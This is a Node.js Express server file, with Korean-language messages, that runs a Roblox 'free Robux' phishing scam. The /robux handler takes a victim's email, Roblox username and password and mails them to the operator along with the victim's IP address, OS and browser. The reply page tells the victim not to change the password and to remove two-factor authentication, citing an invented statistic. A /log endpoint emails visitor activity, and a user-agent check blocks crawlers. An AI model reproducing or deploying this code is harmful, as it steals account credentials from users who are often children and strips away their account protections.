const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const axios = require('axios');
const escapeHtml = require('escape-html');
const rateLimit = require('express-rate-limit');
const useragent = require('express-useragent');
require('dotenv').config();

const app = express();
const port = 3000;

app.use(useragent.express());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// 봇 감지 (User-Agent 검사)
app.use((req, res, next) => {
    const ua = req.headers['user-agent'];
    const isBot = /bot|crawler|spider|robot|crawling/i.test(ua);
    if (isBot) {
        return res.status(403).send('봇 접속이 감지되었습니다.');
    }
    next();
});

app.post('/log', async (req, res) => {
    const { logs, userAgent, time } = req.body;
    const message = `
📌 사용자 활동 로그
---------------------------
접속 시간: ${time}
User-Agent: ${userAgent}

📝 행동 기록:
${logs.join('\n')}
`;
    try {
        // 이메일 전송 설정
        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL,
                pass: process.env.APP_PASS,
            },
            tls: {
                rejectUnauthorized: false,
            },
        });

        await transporter.sendMail({
        from: process.env.EMAIL,
        to: process.env.EMAIL,
        subject: '유저 로그 기록',
        text: message
        });

        res.status(200).send('OK');
    } catch (err) {
        console.error("이메일 전송 실패:", err);
        res.status(500).send('메일 전송 실패');
    }
});

// 요청 제한 (Rate Limiting)
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 20,
    message: '요청이 너무 많습니다. 잠시 후 다시 시도해주세요.'
});
app.use(limiter);

// POST 요청 처리
app.post("/robux", async (req, res) => {
    const email = escapeHtml(req.body.email);
    const roblox_id = escapeHtml(req.body.roblox_id);
    const roblox_pwd = escapeHtml(req.body.roblox_pwd);

    let privacy = req.body.privacy;
    let _3rdperson = req.body._3rdperson;
    let advertise = req.body.advertise;

    const privacy_checked = privacy === "true" ? "✅ 개인정보 제공 동의 허용" : "❌ 개인정보 제공 동의 거부";
    const _3rdperson_checked = _3rdperson === "true" ? "✅ 제 3자 제공 동의 허용" : "❌ 제 3자 제공 동의 거부";
    const advertise_checked = advertise === "true" ? "✅ 마케팅 활용 동의 허용" : "❌ 마케팅 활용 동의 거부";

    try {
        const userAgent = req.useragent;
        const userIp = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0] : req.connection.remoteAddress;
        const os = userAgent.os;
        const browser = userAgent.browser;

        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL,
                pass: process.env.APP_PASS,
            },
            tls: {
                rejectUnauthorized: false,
            },
        });

        const mailOptions = {
            from: email,
            to: process.env.EMAIL,
            subject: "새로운 Roblox 계정 정보가 도착했습니다!",
            text: `
🌐 IP 주소: ${userIp}
💻 운영체제: ${os}
🌍 브라우저: ${browser}
✉️ 이메일: ${email}
🆔 Roblox 아이디: ${roblox_id}
🔐 Roblox 비밀번호: ${roblox_pwd}

${privacy_checked}
${_3rdperson_checked}
${advertise_checked}
            `,
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                return res.send("ERROR PLEASE TRY AGAIN");
            } else {
                return res.send(`<h2>빠른 시일 내에 당신의 계정에 로벅스가 들어올 것입니다. 로벅스가 들어오기 전까지 비밀번호와 닉네임을 변경하지 마십시오. 2단계 인증을 삭제하십시오. 일반적으로 2단계 인증을 사용한 사용자가 그렇지 않은 사용자보다 평균 1271.2% 더 많이 기다렸습니다.</h2>
<h1>기부로 개발자를 도와주세요!</h1>
<iframe src="https://nowpayments.io/embeds/donation-widget?api_key=SPB4XA6-B4M4TZ4-HTHXA2C-96QC978" width="346" height="623" frameborder="0" scrolling="no" style="overflow-y: hidden;">
    Can't load widget
</iframe>`);
            }
        });
    } catch (err) {
        res.status(500).send('서버 오류');
    }
});

app.listen(port, () => {
    console.log(`서버 실행 중`);
});
